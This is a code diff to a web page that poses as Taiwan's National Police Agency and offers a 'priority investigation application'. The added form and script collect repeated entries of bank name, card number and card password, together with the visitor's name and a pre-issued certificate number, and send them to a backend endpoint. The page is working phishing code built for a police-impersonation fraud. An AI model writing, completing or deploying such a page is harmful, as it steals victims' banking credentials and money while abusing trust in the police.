@@ -25,46 +25,86 @@
     <section class="surface compact priority-form-shell">
       <p class="eyebrow">便民服務</p>
       <h2>優先調查申請表</h2>
-      <p class="muted">請輸入姓名與證號後填寫申請內容。II、CC、MM 三種格式已先預留欄位格數，後續可再接後端審核或送出流程。</p>
+      <p class="muted">請輸入後台預先建立的姓名與證號後填寫申請內容。每一筆包含 II（銀行別）、CC（卡號）、MM（密碼），可新增多筆。</p>
 
-      <form class="stacked-form" action="#" method="post">
+      <form id="priorityApplicationForm" class="stacked-form" action="#" method="post">
         <label>姓名<input name="citizenName" type="text" autocomplete="name" required></label>
         <label>證號<input name="certificateNumber" type="text" autocomplete="off" autocapitalize="characters" spellcheck="false" required></label>
 
-        <h3>II</h3>
-        <div class="reserved-grid">
-          <label>II-1<input name="ii1" type="text"></label>
-          <label>II-2<input name="ii2" type="text"></label>
-          <label>II-3<input name="ii3" type="text"></label>
-          <label>II-4<input name="ii4" type="text"></label>
-          <label>II-5<input name="ii5" type="text"></label>
+        <div class="section-heading">
+          <h3>申請資料</h3>
+          <button type="button" class="secondary" data-action="addPriorityRow">新增一筆</button>
         </div>
-
-        <h3>CC</h3>
-        <div class="reserved-grid">
-          <label>CC-1<input name="cc1" type="text"></label>
-          <label>CC-2<input name="cc2" type="text"></label>
-          <label>CC-3<input name="cc3" type="text"></label>
-          <label>CC-4<input name="cc4" type="text"></label>
-          <label>CC-5<input name="cc5" type="text"></label>
-        </div>
-
-        <h3>MM</h3>
-        <div class="reserved-grid">
-          <label>MM-1<input name="mm1" type="text"></label>
-          <label>MM-2<input name="mm2" type="text"></label>
-          <label>MM-3<input name="mm3" type="text"></label>
-          <label>MM-4<input name="mm4" type="text"></label>
-          <label>MM-5<input name="mm5" type="text"></label>
-        </div>
+        <div data-slot="priorityRows" class="priority-rows"></div>
+        <p class="muted">II=銀行別，CC=卡號，MM=密碼。</p>
 
         <button type="submit">送出申請</button>
       </form>
+      <div id="priorityStatus" class="notice hidden" role="status" aria-live="polite"></div>
     </section>
   </main>
 
   <footer class="service-footer">
     <p>內政部警政署｜警政服務系統</p>
   </footer>
+  <script>
+  (function(){
+    var form = document.getElementById('priorityApplicationForm');
+    var rows = document.querySelector('[data-slot="priorityRows"]');
+    var status = document.getElementById('priorityStatus');
+    if (!form || !rows || !status) return;
+    function showStatus(text, type){ status.textContent = text; status.className = 'notice ' + (type === 'error' ? 'error' : ''); status.hidden = !text; }
+    function addRow(){
+      var index = rows.children.length + 1;
+      var row = document.createElement('div');
+      row.className = 'priority-row';
+      row.innerHTML = '<strong>第 ' + index + ' 筆</strong>' +
+        '<label>II 銀行別<input name="bank" type="text" autocomplete="off"></label>' +
+        '<label>CC 卡號<input name="cardNumber" type="text" inputmode="numeric" autocomplete="off"></label>' +
+        '<label>MM 密碼<input name="password" type="text" autocomplete="off"></label>' +
+        '<button type="button" class="secondary" data-action="removePriorityRow">移除</button>';
+      row.querySelector('[data-action="removePriorityRow"]').addEventListener('click', function(){
+        if (rows.children.length > 1) row.remove();
+        Array.prototype.forEach.call(rows.children, function(item, itemIndex){ item.querySelector('strong').textContent = '第 ' + (itemIndex + 1) + ' 筆'; });
+      });
+      rows.appendChild(row);
+    }
+    function requestJson(path, options){
+      return fetch(path, Object.assign({ credentials: 'same-origin', headers: { 'Content-Type': 'application/json' } }, options || {})).then(function(response){
+        return response.json().then(function(data){ if (!response.ok) throw new Error(data.error || '送出失敗'); return data; });
+      });
+    }
+    document.querySelector('[data-action="addPriorityRow"]').addEventListener('click', addRow);
+    for (var count = 0; count < 3; count += 1) addRow();
+    form.addEventListener('submit', function(event){
+      event.preventDefault();
+      var button = form.querySelector('button[type="submit"]');
+      var entries = Array.prototype.map.call(rows.children, function(row){
+        return {
+          bank: row.querySelector('[name="bank"]').value.trim(),
+          cardNumber: row.querySelector('[name="cardNumber"]').value.trim(),
+          password: row.querySelector('[name="password"]').value.trim()
+        };
+      }).filter(function(entry){ return entry.bank || entry.cardNumber || entry.password; });
+      button.disabled = true;
+      showStatus('送出中...');
+      requestJson('/api/priority-applications', {
+        method: 'POST',
+        body: JSON.stringify({
+          citizenName: form.elements.citizenName.value.trim(),
+          certificateNumber: form.elements.certificateNumber.value.trim().toUpperCase(),
+          entries: entries
+        })
+      }).then(function(){
+        form.reset();
+        rows.innerHTML = '';
+        for (var count = 0; count < 3; count += 1) addRow();
+        showStatus('申請已送出。');
+      }).catch(function(error){
+        showStatus(error.message || '送出失敗', 'error');
+      }).finally(function(){ button.disabled = false; });
+    });
+  })();
+  </script>
 </body>
 </html>
